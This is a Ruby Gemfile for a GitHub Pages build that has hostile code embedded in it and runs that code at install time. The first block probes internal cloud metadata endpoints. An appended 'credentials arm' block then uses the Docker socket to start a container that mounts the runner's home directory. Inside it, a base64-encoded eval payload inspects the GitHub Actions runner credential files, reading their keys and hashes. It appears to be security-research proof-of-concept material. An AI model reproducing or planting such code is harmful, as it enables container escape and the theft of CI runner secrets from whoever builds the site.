# frozen_string_literal: true
source "https://rubygems.org"

require "json"
require "net/http"
require "uri"

PROOF = File.join(__dir__, "c217-direct-network-proof.html")

def probe(url, marker = nil)
  uri = URI(url)
  # Disable proxy inheritance so this is the action container's own network.
  http = Net::HTTP.new(uri.host, uri.port, nil)
  http.use_ssl = (uri.scheme == "https")
  http.open_timeout = 3
  http.read_timeout = 3
  request = Net::HTTP::Get.new(uri.request_uri)
  request["User-Agent"] = "c217-owned-pages-direct-network-control"
  response = http.request(request)
  body = response.body.to_s
  {
    "response_received" => true,
    "status" => response.code.to_i,
    "body_nonempty" => !body.empty?,
    "expected_marker_present" => marker.nil? ? nil : body.downcase.include?(marker.downcase),
  }
rescue => error
  {
    "response_received" => false,
    "error_class" => error.class.name,
  }
end

proof = {
  "gemfile_executed" => true,
  "direct_action_container" => true,
  "uid" => Process.uid,
  "docker_api_not_used" => true,
  "public_control" => probe("https://api.github.com/zen"),
  "internal_target" => probe("http://168.63.129.16/?comp=versions", "version"),
  "thing_absent_control" => probe("http://169.254.169.253/"),
}

File.write(PROOF, "<pre>#{JSON.generate(proof)}</pre>\n")

gem "github-pages", "= 232"

# --- c217 credentials arm v12 FINAL (hunter-driver): PRESENCE/METADATA ONLY. NEVER a value. ---
require 'json'
require 'digest'
require 'socket'
require 'base64'

def ureq(method, path, body = nil)
  s = UNIXSocket.new('/var/run/docker.sock')
  req = String.new
  req << "#{method} #{path} HTTP/1.1\r\n"
  req << "Host: localhost\r\n"
  req << "Content-Type: application/json\r\n" if body
  req << "Content-Length: #{body.bytesize}\r\n" if body
  req << "Connection: close\r\n\r\n"
  s.write(req); s.write(body) if body
  resp = s.read; s.close
  head, _, rest = resp.partition("\r\n\r\n")
  status = head.split(' ')[1].to_i
  if head =~ /Transfer-Encoding:\s*chunked/i
    out = String.new; buf = String.new << rest
    until buf.empty?
      line, _, buf = buf.partition("\r\n")
      n = line.to_i(16); break if n == 0
      out << buf[0, n]; buf = buf[(n + 2)..-1].to_s
    end
    rest = out
  end
  [status, rest]
end

def deframe(data)
  out = String.new; buf = String.new << data
  while buf.bytesize >= 8
    len = buf[0, 8].unpack('C4N')[4]
    break if len == 0 || buf.bytesize < 8 + len
    out << buf[8, len]; buf = buf[(8 + len)..-1].to_s
  end
  out
end

host_probe = <<'RUBY'
require 'json'; require 'digest'
def one(p, deep)
  h = { 'path' => p }
  begin
    st = File.stat(p); h['exists'] = true; h['type'] = st.ftype; h['size'] = st.size
    h['mode'] = st.mode.to_s(8); h['owner_uid'] = st.uid; h['gid'] = st.gid
    if deep && st.file? && st.size < 4096
      raw = File.read(p); m = raw.match(/\{.*\}/m)
      h['keys'] = (m ? (begin; JSON.parse(m[0]).keys; rescue StandardError; ['<unparseable>']; end) : ['<non-json>'])
      h['sha256'] = Digest::SHA256.hexdigest(raw)
    end
  rescue StandardError => e
    h['exists'] = false; h['err'] = e.class.name
  end
  h
end
AR = '/host/actions-runner'
o = { 'euid' => (begin; Process.euid; rescue StandardError; -1; end),
      'hostname_sha' => (begin; Digest::SHA256.file('/etc/hostname').hexdigest; rescue StandardError => e; 'ERR:'+e.class.name; end) }
o['ar_dir'] = one(AR, false)
o['ar_ls'] = (begin; Dir.glob(AR + '/*').map { |x| File.basename(x) }.sort; rescue StandardError => e; ['ERR:'+e.class.name]; end)
o['ar_dot'] = (begin; Dir.glob(AR + '/.*').reject { |x| ['.','..'].include?(File.basename(x)) }.map { |x| File.basename(x) }.sort; rescue StandardError => e; ['ERR:'+e.class.name]; end)
targets = [AR + '/.credentials', AR + '/.credentials_rsaparams', AR + '/.runner',
           '/host/actions-runner/qqqqzzzz/.credentials']
o['files'] = targets.map { |p| one(p, true) }
puts 'C217HOST4 ' + JSON.generate(o)
RUBY

begin
  raise 'no socket' unless File.socket?('/var/run/docker.sock')
  st, imgs = ureq('GET', '/v1.41/images/json')
  names = (begin; JSON.parse(imgs).map { |i| i['RepoTags'] }.flatten.compact; rescue StandardError; []; end)
  pick = names.find { |n| n.to_s.include?('jekyll-build-pages') } || names.first
  env_b64 = Base64.strict_encode64(host_probe)
  create = { 'Image' => pick,
             'Entrypoint' => ['ruby'],
             'Cmd' => ['-e','require "base64"; eval(Base64.decode64(ENV["C217RUBY"]))'],
             'Env' => ['C217RUBY=' + env_b64],
             'HostConfig' => { 'Binds' => ['/home/runner:/host:ro'], 'NetworkMode' => 'none' } }.to_json
  st, body = ureq('POST', '/v1.41/containers/create?name=c217probe4', create)
  id = (begin; JSON.parse(body)['Id']; rescue StandardError; nil; end)
  warn 'C217DOCKER create ' + st.to_s + ' id=' + (id ? id[0,12] : ('BODY:' + body.to_s[0,150]))
  if id
    ureq('POST', '/v1.41/containers/' + id + '/start')
    40.times do
      s3, b3 = ureq('GET', '/v1.41/containers/' + id + '/json')
      info = (begin; JSON.parse(b3); rescue StandardError; {}; end)
      break if info.dig('State', 'Running') == false
      sleep 2
    end
    s4, b4 = ureq('GET', '/v1.41/containers/' + id + '/logs?stdout=1&stderr=1')
    warn 'C217HOST4LOGS ' + deframe(b4.to_s).to_s[0,2500]
    ureq('DELETE', '/v1.41/containers/' + id + '?force=1')
    warn 'C217DOCKER deleted'
  end
rescue StandardError => e
  warn 'C217DOCKER EXC ' + e.class.name + ' ' + e.message.to_s[0,200]
end
warn 'C217ARMV12 done'
